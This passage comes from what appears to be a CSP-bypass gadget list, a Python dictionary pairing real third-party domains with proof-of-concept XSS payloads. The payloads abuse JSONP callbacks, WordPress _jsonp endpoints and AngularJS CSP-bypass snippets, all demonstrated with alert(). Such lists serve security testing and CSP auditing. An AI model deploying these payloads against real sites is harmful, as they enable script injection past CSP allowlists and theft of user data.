        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://identitytoolkit.googleapis.com/v1/projects?callback=alert(1)"></script>'],
    },
    "improvedigital.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://improvedigital.com/wp-json?_jsonp=alert"></script>'],
    },
    "info.cloudflare.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://info.cloudflare.com//index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>'
        ],
    },
    "info.elastic.co": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://info.elastic.co/index.php/form/getForm?munchkinId=813-MAM-392&form=6196&callback=alert"></script>'
        ],
    },
    "inno.blob.core.windows.net": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "investor.coinbase.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://investor.coinbase.com/feed/People.svc/GetPeopleList?callback=confirm(document.domain);"></script>'
        ],
    },
    "ipinfo.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://ipinfo.io/?format=jsonp&callback=alert"></script>'],
    },
    "itunes.apple.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>'],
    },
    "jewelbetting.co": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://jewelbetting.co/wp-json?_jsonp=alert"></script>'],
    },
    "jquery.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://jquery.com/wp-json?_jsonp=alert"></script>'],
    },
    "js.hcaptcha.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://js.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>'],
    },
    "jsconfig.adsafeprotected.com": {
        "risks": ["exec"],
        "pocs": [
            "<script src=https://jsconfig.adsafeprotected.com/jsconfig/rjss/st/1/1/skeleton.js?cbName=x;var%20__IASScope;alert(1)></script>"
        ],
    },
    "kampyle.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://kampyle.com/wp-json?_jsonp=alert"></script>'],
    },
    "kbcprod.service-now.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://kbcprod.service-now.com/scripts/angular_includes_1.5.11.jsx"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "kendo.cdn.telerik.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://kendo.cdn.telerik.com/2015.2.805/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "lghnh-mkt-prod1.campaign.adobe.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://lghnh-mkt-prod1.campaign.adobe.com/lgh/at_seg_list.jssp?callback=alert(1)-"></script>'
        ],
    },
    "libsyn.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://libsyn.com/wp-json?_jsonp=alert"></script>'],
    },
    "links.services.disqus.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d&loc=http%3A%2F%2Fabcnews.go.com%2Fblogs%2Fhealth%2F2013%2F03%2F21%2F1-in-10-u-s-deaths-blamed-on-salt%2F&subId=2329827&v=1&jsonp=alert"></script>'
        ],
    },
    "locate.pricespider.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://locate.pricespider.com/?callback=alert(1)"></script>'],
    },
    "lptag.liveperson.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>'
        ],
    },
    "m.media-amazon.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://m.media-amazon.com/images/I/81cx8O4at9L.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "makroo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://makroo.com/wp-json?_jsonp=alert"></script>'],
    },
    "mango.buzzfeed.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>'
        ],
    },
    "maps-api-ssl.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps-api-ssl.google.com/maps/api/js?callback=alert(1337)"></script>'],
    },
    "maps.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps.google.com/maps/api/js?sensor=false&callback=alert(1)"></script>'],
    },
    "maps.google.de": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps.google.de/maps/api/js?sensor=false&callback=alert(1)"></script>'],
    },
    "maps.google.lv": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps.google.lv/maps/api/js?sensor=false&callback=alert(1)"></script>'],
    },
    "maps.google.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps.google.ru/maps/api/js?sensor=false&callback=alert(1)"></script>'],
    },
    "maps.googleapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1337)"></script>',
            '<script src="https://maps.googleapis.com/maps/vt?pb=%211m4%211m3%211i10%212i724%213i439%211m4%211m3%211i10%212i720%213i440%211m4%211m3%211i10%212i720%213i441%211m4%211m3%211i10%212i721%213i440%211m4%211m3%211i10%212i721%213i441%211m4%211m3%211i10%212i722%213i440%211m4%211m3%211i10%212i722%213i441%211m4%211m3%211i10%212i723%213i440%211m4%211m3%211i10%212i723%213i441%211m4%211m3%211i10%212i724%213i440%211m4%211m3%211i10%212i724%213i441%212m3%211e0%212sm%213i773537128%213m13%212sen%213sIN%215e18%2112m5%211e68%212m2%211sset%212sRoadmap%214e2%2112m3%211e37%212m1%211ssmartmaps%214e3%2112m1%215b1%2123i46991212%2123i47054750&callback=alert(10)//&client=google-maps-pro&token=124706"></script>',
        ],
    },
    "mc.yandex.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>'],
    },
    "mouseflow.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://mouseflow.com/wp-json?_jsonp=alert"></script>'],
    },
    "nominatim.openstreetmap.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>'
        ],
    },
    "oamssoqae.ieee.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://oamssoqae.ieee.org/ieeevendorsso/ssocookievalidator?callback=alert(1)-"></script>'
        ],
    },
    "okaccedo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://okaccedo.com/wp-json?_jsonp=alert"></script>'],
    },
    "openexchangerates.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>'
        ],
    },
    "openx.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://openx.com/wp-json?_jsonp=alert"></script>'],
    },
    "page.gitlab.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://page.gitlab.com/index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>'
        ],
    },
    "pages.nist.gov": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://pages.nist.gov/opensource/js/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "partner.googleadservices.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>'
        ],
    },
    "passport.baidu.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>'],
    },
    "polyfill-fastly.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://polyfill-fastly.io/v3/polyfill.min.js?callback=alert"></script>'],
    },
    "polyfill.alicdn.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?callback=alert"></script>'],
    },
    "preply.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://preply.com/wp-json?_jsonp=alert"></script>'],
    },
    "pubads.g.doubleclick.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>'
        ],
    },
    "public-api.wordpress.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=alert"></script>'
        ],
    },
    "publish.twitter.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://publish.twitter.com/oembed?url=https://twitter.com/jack/status/20&callback=alert"></script>'
        ],
    },
    "pubmatic.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://pubmatic.com/wp-json/wp/v2/posts/?_jsonp=alert"></script>'],
    },
    "query.fqtag.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://query.fqtag.com/b?callback=alert(1)"></script>'],
    },
    "r.skimresources.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://r.skimresources.com/api/?callback=alert"></script>'],
    },
    "raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com/json?callback=alert(1)-"></script>'
        ],
    },
    "recaptcha.net": {
        "risks": ["exec"],
        "pocs": ['<script src="https://recaptcha.net/recaptcha/api.js?onload=alert"></script>'],
    },
    "reklamstore.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://reklamstore.com/wp-json?_jsonp=alert"></script>'],
    },
    "rentokil-domains.firebaseio.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>'],
    },
    "resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net/explorercdn/angular1.6/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "resultsmedia.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://resultsmedia.com/wp-json?_jsonp=alert"></script>'],
    },
    "ring.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://ring.com/partials/consent/sv-SE/strings.json?callback=alert"></script>'],
    },
    "romania.amazon.com": {
        "risks": ["exec"],
        "pocs": [
            "<body ng-app ng-csp><script src=\"https://romania.amazon.com/app/vendor.min.js\"></script><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></body>"
        ],
    },
    "rtb0.doubleverify.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://rtb0.doubleverify.com/verify.js?jsCallback=alert(1)"></script>'],
    },
    "s.fqtag.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://s.fqtag.com/b?callback=alert(1)"></script>'],
    },
    "s.yimg.jp": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://s.yimg.jp/images/jpnews/cre/owned_media/v2/js/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "s.ytimg.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "sanalofisonline.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://sanalofisonline.com/wp-json?_jsonp=alert"></script>'],
    },
    "search.yahoo.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>'
        ],
    },
    "secure.gravatar.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>'
        ],
    },
    "securepubads.g.doubleclick.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://securepubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&iu=%2F32173961%2Fdesktop%2Ffrontpage%2Flisting&sz=300x250&url=https%3A%2F%2Fwww.reddit.com%2F&vrg=147&callback=alert"></script>'
        ],
    },
    "server.ethicalads.io": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://server.ethicalads.io/api/v1/decision/?publisher=jsbin&ad_types=x&format=jsonp&div_ids=x&callback=alert(1)-"></script>'
        ],
    },
    "sharethis.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://sharethis.com/wp-json?_jsonp=alert"></script>'],
    },
    "shop.samsung.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>'],
    },
    "smaato.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://smaato.com/wp-json?_jsonp=alert"></script>'],
    },
    "smartcaptcha.yandexcloud.net": {
        "risks": ["exec"],
        "pocs": ['<script src="https://smartcaptcha.yandexcloud.net/captcha.js?render=onload&onload=alert"></script>'],
    },
    "social.yandex.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>'],
    },
    "soundcloud.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>'
        ],
    },
    "srv.carbonads.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://srv.carbonads.net/ads/x.json?callback=alert"></script>'],
    },
    "ssl.gstatic.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "sso.bytedance.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://sso.bytedance.com/watermark/?callback=alert"></script>'],
    },
    "st3.zoom.us": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "static.parastorage.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "storemapper-herokuapp-com.global.ssl.fastly.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://storemapper-herokuapp-com.global.ssl.fastly.net/api/users/9223/stores.js?callback=alert(1)-"></script>'
        ],
    },
    "suggest.taobao.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://suggest.taobao.com/sug?callback=alert"></script>'],
    },
    "suggestqueries-clients6.youtube.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>'
        ],
    },
    "support.zendesk.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>'
        ],
    },
    "sync.im-apps.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>'
        ],
    },
    "tagmanager.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>'
        ],
    },
    "tebilisim.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://tebilisim.com/wp-json?_jsonp=alert"></script>'],
    },
    "termly.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://termly.io/wp-json?_jsonp=alert"></script>'],
    },
    "thebrave.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://thebrave.io/wp-json?_jsonp=alert"></script>'],
    },
    "thiscanbeanything.zendesk.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>'
        ],
    },
    "tlx.3lift.com": {
        "risks": ["exec", "exfil"],
        "pocs": ["<script src=https://tlx.3lift.com/header/auction?callback=alert(1)></script>"],
    },
    "tr.indeed.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://tr.indeed.com/m/newjobs?q=&l=&ts=1734358724474&callback=alert"></script>'],
    },
    "tr.snapchat.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://tr.snapchat.com/config/com/%27%29%3B%7Dcatch%28e%29%7B%7D%7D%3Balert%281%29%3B%21function%28%29%7Btry%7B%28%27.js"></script>'
        ],
    },
    "translate.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>'],
    },
    "translate.googleapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>'
        ],
    },
    "translate.yandex.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>'],
    },
    "trustarc.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://trustarc.com/wp-json?_jsonp=alert"></script>'],
    },
    "typekit.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://typekit.com/api/v1/json/libraries/full?callback=alert"></script>'],
    },
    "udgnoz7mccyaowzp.public.blob.vercel-storage.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>'
        ],
    },
    "ug.alibaba.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://ug.alibaba.com/api/ship/read?callback=alert"></script>'],
    },
    "uk.indeed.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>'],
    },
    "ulogin.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://ulogin.ru/token.php?callback=alert(1337)"></script>'],
    },
    "unpkg.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://unpkg.com/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">',
            '<script src="https://unpkg.com/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">',
            '<script src="https://unpkg.com/hyperscript.org"></script><x _="on load alert(1)">',
        ],
    },
    "urs.pbs.org": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://urs.pbs.org/redirect/1/?format=jsonp&callback=alert(1)"></script>'],
    },
    "usercentrics.eu": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://usercentrics.eu/wp-json?_jsonp=alert"></script>'],
    },
    "vidyome.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://vidyome.com/wp-json?_jsonp=alert"></script>'],
    },
    "vimeo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>'],
    },
    "visitor-service.tealiumiq.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://visitor-service.tealiumiq.com/northwesternmutual/main/q?callback=alert(1)"></script>'
        ],
    },
    "visualwebsiteoptimizer.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://visualwebsiteoptimizer.com/wp-json/wp/v2/posts/?_jsonp=alert"></script>'],
    },
    "wb.amap.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://wb.amap.com/channel.php?callback=alert"></script>'],
    },
    "widget.usersnap.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://widget.usersnap.com/load/d5abc654-0976-45b9-8074-fa5e721db433?onload=alert"></script>'
        ],
    },
    "widgets.pinterest.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>'
        ],
    },
    "wikipedia.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=alert&search=renniepak"></script>'
        ],
    },
    "wordpress.org": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=alert"></script>'],
    },
    "wse.api.here.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://wse.api.here.com/v8/findsequence2?apiKey=<valid-api-key-here>&jsonCallback=alert(origin);void&mode=TransportModes"></script>'
        ],
    },
    "www-api.ibm.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert"></script>'
        ],
    },
    "www.ancestrycdn.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://www.ancestrycdn.com/ui-static/lib/angular/1.2.3/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "www.bing.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.bing.com/api/maps/mapcontrol?key=AlSfV3wSTlPFqxEdS97v1d1ZK25Qg4OxZerOAjFYQPZwtY4bQqhz4jDRou_kCmbJ&callback=alert"></script>'
        ],
    },
    "www.blogger.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.blogger.com/feeds/8063678697117239807/posts/default?callback=alert"></script>'
        ],
    },
    "www.google-analytics.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>'
        ],
    },
    "www.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>',
            "<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>",
            "<script src='https://www.google.com/maps/vt?pb=%211m8%213m7%211m2%211u5376%212u3328%212m2%211u768%212u512%213i5%212m3%211e0%212sm%213i-1%213m3%212sen-IN%213sIN%215e1270%214e4%2111m2%211e2%212b1%2123i72259375%2123i72732929%2123i227337&callback=alert(10);//'></script>",
        ],
    },
    "www.googleapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert(1)"></script>',
            '<script src="https://www.googleapis.com/books/v1/volumes?q=bug+bounty&callback=alert(1)"></script>',
            '<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>',
        ],
    },
    "www.googletagmanager.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>'
        ],
    },
    "www.gstatic.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>',
            "<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>",
        ],
    },
    "www.meteoprog.ua": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>'
        ],
    },
    "www.microsoft.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>'],
    },
    "www.paypal.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>'],
    },
    "www.recaptcha.net": {
        "risks": ["exec"],
        "pocs": ['<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>'],
    },
    "www.reddit.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>'],
    },
    "www.st.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://www.st.com/etc/clientlibs/st-search-cx/stangularjs.min.d9f5c8180af41b5cae710870b6b018fe.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "www.yastat.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "www.yastatic.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "www.youtube.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>'],
    },
    "yandex.st": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button data-toggle="modal" data-target="$(\'head\').html(\'<script>alert(1)</script>\')">Test XSS</button>'
        ],
    },
    "yastat.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "yastatic.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "yoast.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://yoast.com/wp-json?_jsonp=alert"></script>'],
    },
    "yuedust.yuedu.126.net": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "yugiohmonstrosdeduelo.blogspot.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
